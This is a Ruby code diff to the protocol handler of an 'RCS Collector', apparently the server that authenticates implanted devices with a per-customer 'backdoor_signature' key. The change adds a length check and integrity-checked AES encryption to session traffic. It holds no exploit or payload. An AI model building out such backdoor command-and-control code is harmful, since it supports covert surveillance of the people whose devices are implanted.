@@ -14,6 +14,7 @@ require 'rcs-common/pascalize'
 
 # system
 require 'securerandom'
+require 'digest/sha1'
 
 module RCS
 module Collector
@@ -26,14 +27,17 @@ class Protocol
   # Authentication phase
   # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
-  def self.authenticate(peer, uri, cookie, content)
+  def self.authenticate(peer, uri, content)
     trace :info, "[#{peer}] Authentication required..."
+
+    # integrity check (104 byte of data, 112 padded)
+    return unless content.length == 112
 
     # decrypt the message with the per customer signature
     begin
       message = aes_decrypt(content, DB.instance.backdoor_signature)
-    rescue
-      trace :error, "[#{peer}] Invalid message decryption"
+    rescue Exception => e
+      trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
       return
     end
 
@@ -157,11 +161,11 @@ class Protocol
       return
     end
 
-    # decrypt the message
     begin
-      message = aes_decrypt(content, session[:key])
-    rescue
-      trace :error, "[#{peer}][#{cookie}] Invalid message decryption"
+      # decrypt the message
+      message = aes_decrypt_integrity(content, session[:key])
+    rescue Exception => e
+      trace :error, "[#{peer}][#{cookie}] Invalid message decryption: #{e.message}"
       return
     end
 
@@ -179,9 +183,9 @@ class Protocol
       return
     end
     
-    # crypt the message with the session key
     begin
-      response = aes_encrypt(response, session[:key])
+      # crypt the message with the session key
+      response = aes_encrypt_integrity(response, session[:key])
     rescue
       trace :error, "[#{peer}][#{cookie}] Invalid message encryption"
       return
@@ -198,7 +202,7 @@ class Protocol
 
     # if the request does not contains any cookies,
     # we need to perform authentication first
-    return authenticate(peer, uri, cookie, content) if cookie.nil?
+    return authenticate(peer, uri, content) if cookie.nil?
 
     # we have a cookie, check if it's valid
     return unless valid_authentication(peer, cookie)
